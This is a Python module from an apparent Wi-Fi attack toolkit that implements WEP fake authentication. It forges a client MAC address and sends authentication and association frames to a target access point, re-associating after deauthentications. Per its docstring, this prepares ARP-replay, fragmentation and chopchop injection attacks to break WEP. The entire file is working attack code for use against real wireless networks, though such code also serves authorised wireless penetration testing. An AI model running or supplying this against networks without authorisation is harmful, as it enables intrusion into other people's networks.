"""WEP fake authentication (`aireplay-ng -1`).

Open-System Authentication + Association as a forged STA so the AP will accept
frames we inject later (ARP replay, fragmentation, chopchop). On its own it
generates no IVs. It's the prerequisite that unlocks the rest of the WEP suite.

LAZY / on-demand: ``start()`` only arms us (registers our MAC + an RX filter so
we still *hear* deauths); it does NOT authenticate. We stay invisible until a TX
path actually has something to send and calls ``ensure_associated()``, so the
user isn't sitting "associated for no reason", re-announcing every interval. The
TX paths' own data frames keep the AP's inactivity timer alive while they run;
an explicit Deauth/Disassoc (or a replay stall) flips us out of ``associated``
so the *next* ``ensure_associated()`` re-auths within one window. No periodic
keepalive.

``ensure_associated()`` retries silently (3 attempts, ~1s each) and only logs a
FAILURE (once per episode), and a one-line "recovered" if it later comes back.
Routine success is silent; the live status lives in the Focus SECURITY panel via
``state`` (idle / authenticating / associated / failed), ``next_reauth_at`` and
``fail_reason``.
"""

from __future__ import annotations

import asyncio
import logging
import os
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from wifit3.models import AccessPoint
from wifit3.dot11.auth_assoc import auth_req, assoc_req
from wifit3.dot11.packet import AuthPacket, AssocRespPacket, DeauthPacket

logger = logging.getLogger(__name__)

# 802.11 management subtypes we care about in the RX filter.
_SUBTYPE_ASSOC_RESP = 0x01
_SUBTYPE_AUTH = 0x0B
_SUBTYPE_DEAUTH = 0x0C
_SUBTYPE_DISASSOC = 0x0A


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast clear)."""
    return bytes([0x02]) + os.urandom(5)


@dataclass
class FakeAuthStats:
    auth_attempts: int = 0
    associations: int = 0
    reactive_reauths: int = 0
    started_at: float = field(default_factory=time.time)


class WepFakeAuth:
    """On-demand Open-System fake-auth against one WEP AP."""

    _MAX_ATTEMPTS = 3
    _FAIL_BACKOFF = 5.0  # Seconds

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
        assoc_timeout: float = 1.0,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        self.assoc_timeout = assoc_timeout
        self._log = log_callback or (lambda _msg: None)

        self.stats = FakeAuthStats()
        self.state: str = "idle"     # idle|ready|authenticating|associated|failed
        self.fail_reason: Optional[str] = None
        self.next_reauth_at: Optional[float] = None

        self._active = False
        self._auth_lock = asyncio.Lock()
        self._assoc_ok = False
        # Whether we've logged the CURRENT failure episode
        self._announced_failure = False

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        """Arm: register the self MAC + RX filter. Does NOT authenticate."""
        if self._active:
            return
        self._active = True
        self.stats = FakeAuthStats()
        self.state = "ready"
        self.fail_reason = None
        self.next_reauth_at = None
        self._announced_failure = False
        # Self-MAC registration (the YOU client) is the campaign's job via the array; radio-only here.
        self.iface.register_rx_callback(self._rx_cb)
        logger.info("[WEP-FakeAuth] Armed on %s as %s (lazy auth)",
                    self.target.bssid, _mac_str(self.source_mac))

    def stop(self) -> FakeAuthStats:
        """Tear down the RX filter and drop the YOU client."""
        if not self._active:
            return self.stats
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        self.state = "idle"
        self.next_reauth_at = None
        logger.info(
            "[WEP-FakeAuth] Stopped: %d assoc(s), %d reactive re-auth(s).",
            self.stats.associations, self.stats.reactive_reauths,
        )
        return self.stats

    @property
    def is_active(self) -> bool:
        return self._active

    def request_reauth(self) -> None:
        """Drop our associated belief so the next ``ensure_associated()`` re-auth."""
        if self.state == "associated":
            self.stats.reactive_reauths += 1
            self.state = "ready"
            self._assoc_ok = False

    # ---- On-demand association ----------------------------------------------

    async def ensure_associated(self) -> bool:
        """Guarantee we're associated before a TX path transmits."""
        if not self._active:
            return False
        if self.state == "associated":
            return True
        if self._in_backoff():
            return False
        async with self._auth_lock:
            # Re-check under the lock
            if self.state == "associated":
                return True
            if self._in_backoff():
                return False
            return await self._try_associate()

    def _in_backoff(self) -> bool:
        return (
            self.state == "failed"
            and self.next_reauth_at is not None
            and time.time() < self.next_reauth_at
        )

    async def _try_associate(self) -> bool:
        """Up to ``_MAX_ATTEMPTS`` silent auth rounds."""
        for _attempt in range(self._MAX_ATTEMPTS):
            if not self._active:
                return False
            if await self._auth_round():
                self.state = "associated"
                self.fail_reason = None
                self.next_reauth_at = None
                self.stats.associations += 1
                if self._announced_failure:
                    self._log(
                        "[green]✓ Fake-Auth recovered[/green] "
                        f"[dim](associated as {_mac_str(self.source_mac)})[/dim]"
                    )
                    self._announced_failure = False
                return True

        # All attempts failed. Back off and log once per episode.
        self.state = "failed"
        if not self.fail_reason:
            self.fail_reason = "no Assoc resp"
        self.next_reauth_at = time.time() + self._FAIL_BACKOFF
        if not self._announced_failure:
            self._announced_failure = True
            self._log(
                f"[red]✗ Fake-Auth failed:[/red] [white]{self.fail_reason}[/white] "
                f"[dim](retry in {int(self._FAIL_BACKOFF)}s)[/dim]"
            )
        return False

    async def _auth_round(self) -> bool:
        """One Auth → Assoc exchange; returns True iff the AP accepted us."""
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        self.state = "authenticating"
        self._assoc_ok = False
        self.stats.auth_attempts += 1

        await self.iface.send_no_wait(auth_req(self.bssid_bytes, self.source_mac))
        await asyncio.sleep(0.1)  # let the AP process Auth before Assoc lands
        await self.iface.send_no_wait(assoc_req(self.bssid_bytes, self.source_mac,
                                                self.target.ssid or ""))

        deadline = time.time() + self.assoc_timeout
        while time.time() < deadline and self._active and not self._assoc_ok:
            await asyncio.sleep(0.05)
        return self._assoc_ok

    # ---- RX filter (sync, on the loop) --------------------------------------

    def _rx_cb(self, pkt) -> None:
        """React to the AP's typed auth/assoc-resp/deauth replies addressed to our MAC."""
        if not self._active or pkt.raw[4:10] != self.source_mac:   # Addr1 (dest) must be us
            return
        if isinstance(pkt, AssocRespPacket):
            if pkt.status == 0:
                self._assoc_ok = True
            elif pkt.status is not None:
                self.fail_reason = f"Assoc rejected (status {pkt.status})"
        elif isinstance(pkt, AuthPacket):
            if pkt.status not in (0, None):
                self.fail_reason = f"Auth rejected (status {pkt.status})"
        elif isinstance(pkt, DeauthPacket):
            # We got kicked
            if self.state == "associated":
                self.stats.reactive_reauths += 1
            self.state = "ready"
            self._assoc_ok = False
            self.next_reauth_at = None
